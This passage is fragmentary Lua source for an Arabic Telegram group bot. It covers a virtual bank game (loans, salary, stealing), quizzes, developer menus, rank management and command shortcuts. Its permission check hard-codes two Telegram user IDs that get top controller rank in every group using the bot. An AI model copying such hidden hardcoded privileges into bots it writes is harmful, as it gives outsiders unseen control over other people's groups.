Redis:incrby(Fast.."nool:flotysb"..fsvhhh ,UserNameyy)
Redis:decrby(Fast.."nool:flotysb"..msg.sender.user_id ,UserNamey)
Redis:setex(Fast.."polici" .. msg.sender.user_id,600, true)
Redis:setex(Fast.."hramep" ..UserNamey ,600, true)
...
ballancee = Redis:get(Fast.."nool:flotysb"..bl) or 0
Redis:decrby(Fast.."nool:flotysb"..bl , ballancee)
LuaTele.sendText(msg.chat_id,msg.id, "*تم تصفيرة بنجاح !*","md",true)
end

if text == 'قرض' or text == 'قرض' then
if Redis:sismember(Fast.."noooybgy",msg.sender.user_id) then
if Redis:get(Fast.."nnoo1" .. msg.sender.user_id) then  
local check_time = Redis:ttl(Fast.."nnoo1" .. msg.sender.user_id)
rr = oger(check_time)
return LuaTele.sendText(msg.chat_id, msg.id,"• من شوي عطيتك انتظر "..rr.." دقيقة") 
end
if Redis:get(Fast.."xxxr" .. msg.sender.user_id) then
Redis:incrby(Fast.."nool:flotysb"..msg.sender.user_id , 1000000)
Redis:sadd(Fast.."ttpppi",msg.sender.user_id)
return LuaTele.sendText(msg.chat_id,msg.id,"• خذ قرض 1000000 بتكوين 💸","md",true)
end
local jjjo = "6000000"
Redis:incrby(Fast.."nool:flotysb"..msg.sender.user_id , jjjo)
Redis:sadd(Fast.."ttpppi",msg.sender.user_id)
LuaTele.sendText(msg.chat_id,msg.id,"• خذ ي مطفر "..jjjo.." بتكوين 💸","md",true)
Redis:setex(Fast.."nnoo1" .. msg.sender.user_id,600, true)
else
LuaTele.sendText(msg.chat_id,msg.id, "• ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )","md",true)
end
end
...
if Redis:sismember(Fast.."noooybgy",msg.sender.user_id) then
if Redis:get(Fast.."nnoo" .. msg.sender.user_id) then  
local check_time = Redis:ttl(Fast.."nnoo" .. msg.sender.user_id)
rr = oger(check_time)
return LuaTele.sendText(msg.chat_id, msg.id,"• من شوي عطيتك انتظر "..rr.." دقيقة") 
end
if Redis:get(Fast.."xxxr" .. msg.sender.user_id) then
Redis:incrby(Fast.."nool:flotysb"..msg.sender.user_id , 3000)
Redis:sadd(Fast.."ttpppi",msg.sender.user_id)
...
Redis:sadd(Fast.."ttpppi",msg.sender.user_id)
LuaTele.sendText(msg.chat_id,msg.id,"• خذ ي مطفر "..jjjo.." بتكوين 🪙","md",true)
Redis:setex(Fast.."nnoo" .. msg.sender.user_id,600, true)
else
LuaTele.sendText(msg.chat_id,msg.id, "• ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )","md",true)
end
end
...
if Redis:sismember(Fast.."noooybgy",UserId_Info.id) then
ballanceed = Redis:get(Fast.."nool:flotysb"..UserId_Info.id) or 0
LuaTele.sendText(msg.chat_id,msg.id, "• فلوسه "..ballanceed.." بتكوين 🪙","md",true)
else
...
if Redis:get(Fast.."polic" .. msg.sender.user_id) then  
local check_time = Redis:ttl(Fast.."polic" .. msg.sender.user_id)
rr = oger(check_time)
...
if Redis:get(Fast.."hrame" .. Remsg.sender.user_id) then  
local check_time = Redis:ttl(Fast.."hrame" .. Remsg.sender.user_id)
rr = oger(check_time)
return LuaTele.sendText(msg.chat_id, msg.id,"• زارفينه قبلك \n• يمديك تزرفه بعد "..rr.." دقيقة") 
end 
if Redis:sismember(Fast.."noooybgy",Remsg.sender.user_id) then
ballanceed = Redis:get(Fast.."nool:flotysb"..Remsg.sender.user_id) or 0
...
local ballanceed = Redis:get(Fast.."nool:flotysb"..Remsg.sender.user_id) or 0
Redis:incrby(Fast.."nool:flotysb"..msg.sender.user_id , hrame)
Redis:decrby(Fast.."nool:flotysb"..Remsg.sender.user_id , hrame)
Redis:sadd(Fast.."ttpppi",msg.sender.user_id)
Redis:setex(Fast.."hrame" .. Remsg.sender.user_id,900, true)
Redis:incrby(Fast.."zrffdcf"..msg.sender.user_id,hrame)
Redis:sadd(Fast.."zrfffidtf",msg.sender.user_id)
Redis:setex(Fast.."polic" .. msg.sender.user_id,300, true)
...
Redis:incrby(Fast.."nool:flotysb"..msg.sender.user_id , F)
local ballancee = Redis:get(Fast.."nool:flotysb"..msg.sender.user_id) or 0
...
Redis:setex(Fast.."innoo" .. msg.sender.user_id,600, true)
end
if text == 'راتب' or text == 'راتبي' then
if Redis:sismember(Fast.."noooybgy",msg.sender.user_id) then
if Redis:get(Fast.."innoo" .. msg.sender.user_id) then  
local check_time = Redis:ttl(Fast.."innoo" .. msg.sender.user_id)
rr = oger(check_time)
...
if Redis:get(Fast.."Status:Games"..msg.chat_id) then
KlamSpeed = {"شوان","سام","ايد شيرين","جاستين","اريانا","سام سميث","ايد","جاستين","معزه","ميسي","صلاح","محمد صلاح","احمد عز","كينج","كريستيانو","كريستيانو رونالدو","رامز جلال","امير كراره","ويجز","بابلو","تامر حسني","ابيو","شيرين","نانسي عجرم","محمد رمضان","احمد حلمي","محمد هنيدي","حسن حسني","حماقي","احمد مكي"};
...
name = string.gsub(name,"مصر","https://t.me/kinggoo71/2")
name = string.gsub(name,"العراق","https://t.me/kinggoo71/3")
name = string.gsub(name,"السعوديه","https://t.me/kinggoo71/4")
name = string.gsub(name,"المانيا","https://t.me/kinggoo71/5")
name = string.gsub(name,"تونس","https://t.me/kinggoo71/6")
name = string.gsub(name,"الجزائر","https://t.me/kinggoo71/7")
name = string.gsub(name,"فلسطين","https://t.me/kinggoo71/8")
name = string.gsub(name,"اليمن","https://t.me/kinggoo71/9")
name = string.gsub(name,"المغرب","https://t.me/kinggoo71/10")
name = string.gsub(name,"البحرين","https://t.me/kinggoo71/11")
name = string.gsub(name,"فرنسا","https://t.me/kinggoo71/12")
name = string.gsub(name,"سويسرا","https://t.me/kinggoo71/13")
name = string.gsub(name,"انجلترا","https://t.me/kinggoo71/14")
name = string.gsub(name,"تركيا","https://t.me/kinggoo71/15")
name = string.gsub(name,"الولايات المتحده","https://t.me/kinggoo71/16")
name = string.gsub(name,"كندا","https://t.me/kinggoo71/17")
name = string.gsub(name,"الكويت","https://t.me/kinggoo71/18")
name = string.gsub(name,"ليبيا","https://t.me/kinggoo71/19")
name = string.gsub(name,"السودان","https://t.me/kinggoo71/20")
...
Redis:incrby(Fast.."Num:Message:User"..msg.chat_id..":"..msg.sender.user_id,NumGame)  
...
"سؤال ينرفزك ؟ ", 
" هل يعجبك ᯓ˚₊·𝑆𝑂𝑈𝑅𝐶𝐸 𝑇𝑆𝐻𝐴𝐾𝐼.↺؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في ᯓ˚₊·𝑆𝑂𝑈𝑅𝐶𝐸 𝑇𝑆𝐻𝐴𝐾𝐼.↺؟ ", 
"كم مره حبيت؟ ", 
...
return LuaTele.sendText(msg_chat_id,msg_id,'⋆ ︙اهلا بك مجددا عزيزي المطور \n⋆ ︙اليك الازرار الخاصه ب التفعيل والتعطيل لᯓ˚₊·𝑆𝑂𝑈𝑅𝐶𝐸 𝑇𝑆𝐻𝐴𝐾𝐼.↺ فقط اضغط على الامر الذي تريد تنفيذه', 'md', false, false, false, false, reply_markup)
end
...
{{text = 'رجـوع ⋆',type = 'text'},},}}
return LuaTele.sendText(msg_chat_id,msg_id,'⋆ ︙اهلا بك مجددا عزيزي المطور \n⋆ ︙اليك الازرار الخاصه ب أحصائيات  ᯓ˚₊·𝑆𝑂𝑈𝑅𝐶𝐸 𝑇𝑆𝐻𝐴𝐾𝐼.↺ فقط اضغط على الامر الذي تريد تنفيذه', 'md', false, false, false, false, reply_markup)
end
...
{{text = 'الغاء ⋆',type = 'text'},},
{{text = 'رجـوع ⋆',type = 'text'},},}}
return LuaTele.sendText(msg_chat_id,msg_id,'⋆ ︙اهلا بك مجددا عزيزي المطور \n⋆ ︙اليك الازرار الخاصه ب المطورين لᯓ˚₊·𝑆𝑂𝑈𝑅𝐶𝐸 𝑇𝑆𝐻𝐴𝐾𝐼.↺ فقط اضغط على الامر الذي تريد تنفيذه', 'md', false, false, false, false, reply_markup)
end
...
{{text = 'الغاء ⋆',type = 'text'},},
{{text = 'رجـوع ⋆',type = 'text'},},}}
return LuaTele.sendText(msg_chat_id,msg_id,'⋆ ︙اهلا بك مجددا عزيزي المطور \n⋆ ︙اليك الازرار الخاصه بالاذاعه لᯓ˚₊·𝑆𝑂𝑈𝑅𝐶𝐸 𝑇𝑆𝐻𝐴𝐾𝐼.↺ فقط اضغط على الامر الذي تريد تنفيذه', 'md', false, false, false, false, reply_markup)
end
...
{{text = 'الغاء ⋆',type = 'text'},},
{{text = 'رجـوع ⋆',type = 'text'},},}}
return LuaTele.sendText(msg_chat_id,msg_id,'⋆ ︙اهلا بك مجددا عزيزي المطور \n⋆ ︙اليك الازرار الخاصه بالعام لᯓ˚₊·𝑆𝑂𝑈𝑅𝐶𝐸 𝑇𝑆𝐻𝐴𝐾𝐼.↺ فقط اضغط على الامر الذي تريد تنفيذه', 'md', false, false, false, false, reply_markup)
end
...
{{text = 'الغاء ⋆',type = 'text'},},
{{text = 'رجـوع ⋆',type = 'text'},},}}
return LuaTele.sendText(msg_chat_id,msg_id,'⋆ ︙اهلا بك مجددا عزيزي المطور \n⋆ ︙اليك الازرار الخاصه ببوتك المثبت علئ لᯓ˚₊·𝑆𝑂𝑈𝑅𝐶𝐸 𝑇𝑆𝐻𝐴𝐾𝐼.↺ فقط اضغط على الامر الذي تريد تنفيذه', 'md', false, false, false, false, reply_markup)
end
--     Source Fast     --
--     end start chat Pv     --
if text == 'تنظيف المشتركين ⋆' then
...
reply_markup = {
inline_keyboard ={
{{text ="• Fast Source", url= "https://t.me/SOo_KING"}},
}
},
},
}
...
if tonumber(IdUser) == 5151007856 then
data.The_Controller = 1
elseif tonumber(IdUser) == 5194316700 then
data.The_Controller = 1
...
elseif Redis:sismember(Fast.."Owners:Group"..ChatId,IdUser) == true then
data.The_Controller = 44
elseif Redis:sismember(Fast.."Supcreator:Group"..ChatId,IdUser) == true then
...
if Redis:sismember(Fast.."Supcreator:Group"..ChatId,UserId[2]) then
Redis:srem(Fast.."Supcreator:Group"..ChatId,UserId[2])
else
Redis:sadd(Fast.."Supcreator:Group"..ChatId,UserId[2])
end
...
local Info_Members = Redis:smembers(Fast.."Owners:Group"..ChatId) 
if #Info_Members == 0 then
...
local Info_Members = Redis:smembers(Fast.."Supcreator:Group"..ChatId) 
if #Info_Members == 0 then
...
local Info_Members = Redis:smembers(Fast.."Special:Group"..ChatId) 
if #Info_Members == 0 then
...
if tonumber(IdUser) == tonumber(UserId[1]) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'ᯓ˚₊·𝑆𝑂𝑈𝑅𝐶𝐸 𝑇𝑆𝐻𝐴𝐾𝐼.↺', url = 't.me/SOo_KING'}, },}}
...
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'قناه السورس', url = 'https://t.me/SOo_KING'}, },}}
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'sᴏᴜʀᴄʀ Fast',url='http://t.me/SOo_KING'}},
}
...
keyboard = {} 
keyboard.inline_keyboard = {{{text = 'sᴏᴜʀᴄʀ Fast',url='http://t.me/SOo_KING'}},}
...
local TextHelp = [[*
⋆ أهلا بك في قائمة العاب ᯓ˚₊·𝑆𝑂𝑈𝑅𝐶𝐸 𝑇𝑆𝐻𝐴𝐾𝐼.↺ اختر نوع الالعاب 
*]]
LuaTele.editMessageText(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
...
{{text = 'قناه السورس', url = 't.me/SOo_KING'}, },}}
local TextHelp = [[*
⋆ مرحبا بك في الالعاب المتطورة الخاص بᯓ˚₊·𝑆𝑂𝑈𝑅𝐶𝐸 𝑇𝑆𝐻𝐴𝐾𝐼.↺
...
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'قناة السورس', url = 'https://t.me/SOo_KING'}, },}}
...
Redis:set(Fast.."Get:Reides:Commands:Group"..ChatId..":"..'تعط','تعطيل الايدي بالصوره')
Redis:sadd(Fast.."Command:List:Group"..ChatId,"تعط")
Redis:set(Fast.."Get:Reides:Commands:Group"..ChatId..":"..'تفع','تفعيل الايدي بالصوره')
Redis:sadd(Fast.."Command:List:Group"..ChatId,"تفع")
Redis:set(Fast.."Get:Reides:Commands:Group"..ChatId..":"..'ا','ايدي')
Redis:sadd(Fast.."Command:List:Group"..ChatId,"ا")
Redis:set(Fast.."Get:Reides:Commands:Group"..ChatId..":"..'م','رفع مميز')
Redis:sadd(Fast.."Command:List:Group"..ChatId,"م")
Redis:set(Fast.."Get:Reides:Commands:Group"..ChatId..":"..'اد', 'رفع ادمن')
Redis:sadd(Fast.."Command:List:Group"..ChatId,"اد")
Redis:set(Fast.."Get:Reides:Commands:Group"..ChatId..":"..'مد','رفع مدير')
Redis:sadd(Fast.."Command:List:Group"..ChatId,"مد")
Redis:set(Fast.."Get:Reides:Commands:Group"..ChatId..":"..'من', 'رفع منشئ')
Redis:sadd(Fast.."Command:List:Group"..ChatId,"من")
Redis:set(Fast.."Get:Reides:Commands:Group"..ChatId..":"..'اس', 'رفع منشئ اساسي')
...
Redis:set(Fast.."Get:Reides:Commands:Group"..ChatId..":"..'ر','الرابط')
Redis:sadd(Fast.."Command:List:Group"..ChatId,"ر")
Redis:set(Fast.."Get:Reides:Commands:Group"..ChatId..":"..'رر','ردود المدير')
Redis:sadd(Fast.."Command:List:Group"..ChatId,"رر")
Redis:set(Fast.."Get:Reides:Commands:Group"..ChatId..":"..'مسح المكتومين','ممكتومين')
Redis:sadd(Fast.."Command:List:Group"..ChatId,"ممكتومين")
Redis:set(Fast.."Get:Reides:Commands:Group"..ChatId..":"..'رد','اضف رد')
Redis:sadd(Fast.."Command:List:Group"..ChatId,"رد")
Redis:set(Fast.."Get:Reides:Commands:Group"..ChatId..":"..'سح','مسح سحكاتي')
Redis:sadd(Fast.."Command:List:Group"..ChatId,"سح")
Redis:set(Fast.."Get:Reides:Commands:Group"..ChatId..":"..'رس','مسح رسائلي')
Redis:sadd(Fast.."Command:List:Group"..ChatId,"رس")
Redis:set(Fast.."Get:Reides:Commands:Group"..ChatId..":"..'غ','غنيلي')
Redis:sadd(Fast.."Command:List:Group"..ChatId,"غ")
Redis:set(Fast.."Get:Reides:Commands:Group"..ChatId..":"..'#','مسح قائمه العام')
Redis:sadd(Fast.."Command:List:Group"..ChatId,"#")
local txxt = [[
⋆ تم ترتيب الاوامر بالشكل التالي ~
⋆  ايدي - ا .
⋆  رفع مميز - م .
...
Fastusername = '*تم الزواج بنجاح \nمبروك  يا  ↫ *['..bain.first_name..'](tg://user?id='..bain.id..' *\n*'
else
Fastusername = 'لا يوجد'
end
LuaTele.editMessageText(ChatId,Msg_id,Fastusername, 'md', true, false, reply_markup)
end
end
